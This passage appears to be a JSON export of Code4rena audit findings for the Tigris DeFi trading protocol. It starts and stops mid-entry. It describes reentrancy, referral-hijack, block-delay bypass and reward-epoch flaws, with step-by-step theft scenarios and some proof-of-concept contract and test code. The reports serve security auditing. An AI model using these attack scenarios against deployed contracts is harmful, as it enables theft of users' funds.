parseEther(\"20000\"), 0, 2000000000, false]; +      let message = ethers.utils.keccak256( +        ethers.utils.defaultAbiCoder.encode( +          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'], +          [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false] +        ) +      ); +      let sig = await node.signMessage( +        Buffer.from(message.substring(2), 'hex') +      ); +       +      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true]; +      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); + + +      await trading.connect(owner).approveProxy(myTrader.address, 1e10); +      await myTrader.connect(owner).closeTrade(1, PriceData, sig); + + +    }); +  return; +      it(\"Closing over 100% should revert\", async function () {        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]; @@ -551,8 +582,10 @@ describe(\"Trading\", function () {                let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); +        await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(\"BadClosePercent\");      }); +    return;      it(\"Closing 0% should revert\", async function () {        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 0, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther(\"20000\"), 0, 2000000000, false]; @@ -700,6 +733,7 @@ describe(\"Trading\", function () {        expect(margin).to.equal(parseEther(\"500\"));      });    }); +  return;    describe(\"Trading using <18 decimal token\", async function () {      it(\"Opening and closing a position with tigUSD output\", async function () {        await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time  ```  `MyTrader.sol`: ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0;  import {ITrading} from \"../interfaces/ITrading.sol\"; import \"../utils/TradingLibrary.sol\"; import \"../interfaces/IPosition.sol\"; import {ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";     contract MyTrader{      ITrading trading;     IPosition position;      receive() payable external{      }      constructor(address _trading, address _position){         trading = ITrading(_trading);         position = IPosition(_position);     }      function closeTrade(         uint _id,         PriceData calldata _priceData,         bytes calldata _signature     ) public{         bool _tp = false;                  trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);         trading.limitClose(_id, _tp, _priceData, _signature);               }  } ```  ## Recommended Mitigation Steps Don't allow updating sl or tp and "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/445", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/unforgiven-Q.md)."}, {"title": "distribute() won't update epoch[tigAsset] when totalShares[tigAsset]==0 which can cause later created bond for this tigAsset to have wrong mint epoch", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/436", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-16"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86   # Vulnerability details  ## Impact Function `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`, function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. so during normal bond creation the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. but if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` to set very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`. This would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.  ## Proof of Concept This is `distribute()` code in BondNFT contract: ``` function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` As you can see when `totalShares[_tigAsset] == 0` then the value of `epoch[_tigAsset]` won't get updated to the today. and there is no other logics in the code to update `epoch[tigAsset]`. so when `totalShares[_tigAsset] == 0` then the value of the `epoch[tigAsset]` would be out dated. this would happen when asset is recently added to the BondNFT assets or when in some time there is no bond left. When this condition happens and a user call `Lock.lock()` to create a bond the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0 so for that asset `epoch[]` won't get updated and in the `BondNFT.createLock()` the wrong value would set as bond't mint epoch. This is `Lock.lock()` code: ```     function lock(         address _asset,         uint _amount,         uint _period     ) public {         require(_period <= maxPeriod, \"MAX PERIOD\");         require(_period >= minPeriod, \"MIN PERIOD\");         require(allowedAssets[_asset], \"!asset\");          claimGovFees();          IERC20(_asset).transferFrom(msg.sender, address(this), _amount);         totalLocked[_asset] += _amount;                  bondNFT.createLock( _asset, _amount, _period, msg.sender);     } ``` And this is `BondNFT.createLock()` code: ```     function createLock(         address _asset,         uint _amount,         uint _period,         address _owner     ) external onlyManager() returns(uint id) {         require(allowedAsset[_asset], \"!Asset\");         unchecked {             uint shares = _amount * _period / 365;             uint expireEpoch = epoch[_asset] + _period;             id = ++totalBonds;             totalShares[_asset] += shares;             Bond memory _bond = Bond(                 id,             // id                 address(0),     // owner                 _asset,         // tigAsset token                 _amount,        // tigAsset amount                 epoch[_asset],  // mint epoch                 block.timestamp,// mint timestamp                 expireEpoch,    // expire epoch                 0,              // pending                 shares,         // linearly scaling share of rewards                 _period,        // lock period                 false           // is expired boolean             );             _idToBond[id] = _bond;             _mint(_owner, _bond);         }         emit Lock(_asset, _amount, _period, _owner, id);     } ```  if a bond get wrong value for mint epoch it would have wrong value for expire epoch and user would get a lot of share by lock for small time. for example this scenario: 1. let's assume `epoch[asset1]` is out dated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days) 2. during this time because `totalShare[asset1]` was 0 so `distribute()` function won't udpate `epoch[asset1]` and `epoch[asset1]` would show 30 days ago. 3. attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days. 4. some reward would get distributed into the BondNFT for the `asset1`. 5. other users would create lock too. 6. attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.  so attacker was able to create lock for long time and get shares and rewards based on that but attacker can release lock after short time.  ## Tools Used VIM  ## Recommended Mitigation Steps update `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated."}, {"title": "_checkDelay will not work properly for Arbitrum or Optimism due to block.number ", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/419", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "selected for report", "sponsor confirmed", "M-15"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868   # Vulnerability details  ## Impact  Trade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices   ## Proof of Concept      function _checkDelay(uint _id, bool _type) internal {         unchecked {             Delay memory _delay = blockDelayPassed[_id];             //in those situations             if (_delay.actionType == _type) {                 blockDelayPassed[_id].delay = block.number + blockDelay;             } else {                 if (block.number < _delay.delay) revert(\"0\"); //Wait                 blockDelayPassed[_id].delay = block.number + blockDelay;                 blockDelayPassed[_id].actionType = _type;             }         }     }  _checkDelay enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. The user would open their position 1 Arbitrum block before the sync happens, the close it the very next block. It would appear that there has been 5 block (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks I would be impossible to block this behavior through parameter changes.  It also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  The delay should be measured using block.timestamp rather than block.number"}, {"title": "reentrancy attack during mint() function in Position contract which can lead to removing of the other user's limit orders or stealing contract funds because initId is set low value", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/400", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-07"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Position.sol#L126-L161   # Vulnerability details  ## Impact Function `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give attacker opportunity to reenter the Trading contract logics and perform malicious action while contract storage state is wrong. the only limitation of the attacker is that he need to bypass `_checkDelay()` checks. attacker can perform this action: 1. call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code. 2. call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.  ## Proof of Concept This is `mint()` code in Position contract: ```     function mint(         MintTrade memory _mintTrade     ) external onlyMinter {         uint newTokenID = _tokenIds.current();          Trade storage newTrade = _trades[newTokenID];         newTrade.margin = _mintTrade.margin;         newTrade.leverage = _mintTrade.leverage;         newTrade.asset = _mintTrade.asset;         newTrade.direction = _mintTrade.direction;         newTrade.price = _mintTrade.price;         newTrade.tpPrice = _mintTrade.tp;         newTrade.slPrice = _mintTrade.sl;         newTrade.orderType = _mintTrade.orderType;         newTrade.id = newTokenID;         newTrade.tigAsset = _mintTrade.tigAsset;          _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage         if (_mintTrade.orderType > 0) { // update the values of some storage functions             _limitOrders[_mintTrade.asset].push(newTokenID);             _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;         } else {             initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;             _openPositions.push(newTokenID);             _openPositionsIndexes[newTokenID] = _openPositions.length-1;              _assetOpenPositions[_mintTrade.asset].push(newTokenID);             _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;         }         _tokenIds.increment();     } ``` As you can see by calling `_safeMint()` code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. so code don't follow check-effect-interaction pattern and it's possible to perform reentrancy attack. there could be multiple scenarios that attacker can perform the attack and do some damage. two of them are:   **scenario #1 where attacker remove other users limit orders and create broken storage state** 1. attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1. 2. then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check. 3. variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list. 4. attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`. 5. `cancelLimitOrder()` checks would pass and would tries to call `Position.burn(ID1)`. 6. `burn()` function would tries to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0 so code would remove the 0 index limit order which is belongs to another user. 7. execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.  so there is two impact here, first other users limit order got removed and the second is that contract storage had bad state and burned tokens get stock in the list.   **scenario #2 where attacker steal contract/users funds by wrong profit calculation** 1. attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low. 2. code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address. 3. the value of `initId[ID1]` is not yet set for ID1. 4. attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position. 5. code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value were be based on the `newMargin`. 6. the execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value. 7. then the value of `initId[ID1]` for attacker position would be very low which would cause `accInterest` to be very higher than it supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.  so attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.  there can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.  ## Tools Used VIM  ## Recommended Mitigation Steps follow the check-effect-interaction pattern."}, {"title": "one can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn't approve it", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/379", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "judge review requested", "selected for report", "sponsor confirmed", "M-13"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152   # Vulnerability details  ## Impact By default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.  ## Proof of Concept This is `createReferralCode()` code: ```     function createReferralCode(bytes32 _hash) external {         require(_referral[_hash] == address(0), \"Referral code already exists\");         _referral[_hash] = _msgSender();         emit ReferralCreated(_msgSender(), _hash);     } ``` As you can see attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this). Then in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral. ```     function getRef(         address _trader     ) external view returns(address) {         return referrals.getReferral(referrals.getReferred(_trader));     } ``` in the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress. `_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee form a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.  ## Tools Used VIM  ## Recommended Mitigation Steps prevent some one from setting 0x0 hash for their referral code."}, {"title": "`_handleOpenFees` returns an incorrect value for `_feePaid`. This directly impacts margin calculations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/367", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734   # Vulnerability details  ## Impact  Formula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk  On initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by `_handleOpenFees ` is deducted from Initial margin posted by user.  formula misses to account the `2*referralFee` component while calculaing `_feePaid`  ## Proof of Concept Note that `_feePaid` as per formula in Line 734 is the sum of `_daoFeesPaid', and sum of `burnerFee` & `botFee`. `_daoFeesPaid` is calculated from `_fees.daoFees` which itself is calculated by subtracting `2*referralFee` and `botFee`.   So when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.   This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.   ## Tools Used  ## Recommended Mitigation Steps  Suggest replacing the formula in line 734 with below (adding back _fees.referralFees*2)  ```             _feePaid =                 _positionSize                 * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 )                  / DIVISION_CONSTANT // divide by 100%                 + _daoFeesPaid; ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/366", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/365", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-03"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/IllIllI-G.md)."}, {"title": "BondNFT#extendLock force a user to extend the bond at least for current bond.period", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/359", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-10"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L97-L125   # Vulnerability details  ## Description The current implementation forces a user to extend their bonds for at least they current bond period. These mean that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.  If we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current ```BondNFT.extendLock``` function should be refactored.  ## Impact * Current ```BondNFT.extendLock``` function does not work as expected, forcing user who want to extend their bond to extend them at least for their current bond.period. * For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.  ## POC ```typescript // In 09.Bond.js,  describe \"Extending lock\" it(\"POC: Extending the lock does not work as expected\", async function () {       await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"100\"));       // user lock bond funds for 10 days       await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 10);        const fiveDaysTime = 5 * 24 * 60 * 60       const eightDaysTime = 8 * 24 * 60 * 60        // owner distribute rewards       console.log(\"User created a lock for 10 days\")       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"10\"));       await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(\"10\"));        // Five days pass       await network.provider.send(\"evm_increaseTime\", [fiveDaysTime]); // Skip 10 days       await network.provider.send(\"evm_mine\");       console.log(\"\\n5 days pass\")        // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days       const bondInfoBeforeExtension = await bond.idToBond(1)       console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)              await lock.connect(user).extendLock(1, 0, 3)       console.log(\"Bond was extended for 3 days\")       const bondInfoAfterExtension = await bond.idToBond(1)       console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)        // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)       await network.provider.send(\"evm_increaseTime\", [eightDaysTime]);       await network.provider.send(\"evm_mine\");       console.log(\"\\n8 days later\")       console.log(\"After 13 days (10 original days + 3 days from extension) the user can not release the bond\")              // The user decide to claim their part and get their bond amount       // The user should recieve all the current funds in the contract       await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')      }); ```  ## Mitigation steps In order to ```extendLock``` to work properly, the current implementation  should be changed to: ```diff function extendLock(     uint _id,     address _asset,     uint _amount,     uint _period,     address _sender ) external onlyManager() {     Bond memory bond = idToBond(_id);     Bond storage _bond = _idToBond[_id];     require(bond.owner == _sender, \"!owner\");     require(!bond.expired, \"Expired\");     require(bond.asset == _asset, \"!BondAsset\");     require(bond.pending == 0); //Cannot extend a lock with pending rewards +   uint currentEpoch = block.timestamp/DAY; -   require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");     require(epoch[bond.asset] == currentEpoch, \"Bad epoch\");  +   uint pendingEpochs = bond.expireEpoch - currentEpoch; +   uint newBondPeriod = pendingEpochs + _period; +   //In order to respect min bond period when we extend a bon +   // Next line can be omitted at discretion of the protocol and devs +   // If it is omitted any created bond would be able to be extended always (except from those with period = 365) +   require(newBondPeriod >= 7, \"MIN PERIOD\");  -    require(bond.period+_period <= 365, \"MAX PERIOD\"); +    require(newBondPeriod <= 365, \"MAX PERIOD\");          unchecked { -       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365; +       uint shares = (bond.amount + _amount) * newBondPeriod / 365;  -       uint expireEpoch = block.timestamp/DAY + bond.period + _period; +       uint expireEpoch = currentEpoch + newBondPeriod;          totalShares[bond.asset] += shares-bond.shares;         _bond.shares = shares;         _bond.amount += _amount;         _bond.expireEpoch = expireEpoch;         _bond.period += _period;         _bond.mintTime = block.timestamp;  -       _bond.mintEpoch = epoch[bond.asset]; +       _bond.mintEpoch = currentEpoch; -       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18; +       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;     }     emit ExtendLock(_period, _amount, _sender,  _id); } ```"}, {"title": "`safeTransferMany()` doesn't actually use safe transfer", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/356", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285   # Vulnerability details  Both `BondNFT` and `GovNFT` are an ERC721 implementation, they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once. However the function doesn't actually safe transfer (doesn't )  ## Impact Users might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.  ## Proof of Concept I've added the following tests to the `GovNFT` tests. 1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer. 2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.  ```diff diff --git a/test/05.GovNFT.js b/test/05.GovNFT.js index 711a649..d927320 100644 --- a/test/05.GovNFT.js +++ b/test/05.GovNFT.js @@ -98,6 +98,14 @@ describe(\"govnft\", function () {        expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);        expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);      }); + +    it(\"Safe transfer to non ERC721Receiver\", async function () { +       +      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\"); +    }); +    it(\"Safe transfer many  to non ERC721Receiver\", async function () { +      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\"); +    });      it(\"Transferring an NFT with pending delisted rewards should not affect pending rewards\", async function () {        await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);        expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);  ```  Output (I've shortened the output. following test will also fail, since the successful transfer will affect them):  ```       \u2714 Safe transfer to contract       1) Safe transfer many to contract     11 passing (3s)   1 failing    1) govnft        Reward system related functions          Safe transfer many to contract:        AssertionError: Expected transaction to be reverted       + expected - actual        -Transaction NOT reverted.       +Transaction reverted. ```   ## Recommended Mitigation Steps Call `_safeTransfer()` instead of `_transfer()`."}, {"title": "GovNFT: maxBridge has no effect", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/334", "labels": ["bug", "2 (Med Risk)", "judge review requested", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20   # Vulnerability details  ## Impact In GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT. ```solidity     uint256 public maxBridge = 20; ...     function setMaxBridge(uint256 _max) external onlyOwner {         maxBridge = _max;     } ``` ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313 ## Tools Used None ## Recommended Mitigation Steps Consider applying the maxBridge variable"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/268", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "Incorrect calculation of new price while adding position", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/236", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-06"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L295   # Vulnerability details  ## Impact The formula used for calculating ````_newPrice```` in ````addToPosition()```` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.  The wrong formula  ``` uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin; ```  The correct formula is ``` uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price); ```  Why this workS? Given ``` P1 = _trade.price P2 = _price P = _newPrice M1 = _trade.margin M2 = _addMargin M =  M1 + M2 = _newMargin L = _trade.leverage U1 = M1 * L  = old position in USD U2 = M2 * L = new position in USD U = U1 + U2 = total position in USD E1 = U1 / P1 = old position of base asset, such as ETH, of the pair E2 = U2 / P2 = new position of base asset of the pair E = E1 + E2 = total position of base asset of the pair ```  Then ``` P = U / E   = (U1 + U2) / (E1 + E2)   = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)   = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)   = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)   = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]   = P1 * P2 * M / (M1 * P2 + M2 * P1) ``` proven.  ## Proof of Concept The following test case shows two examples that users lose some funds due to add new position whenever their existing position is in profit or loss state.  ``` const { expect } = require(\"chai\"); const { deployments, ethers, waffle } = require(\"hardhat\"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require(\"constants\");  describe(\"Incorrect calculation of new margin price while adding position\", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let 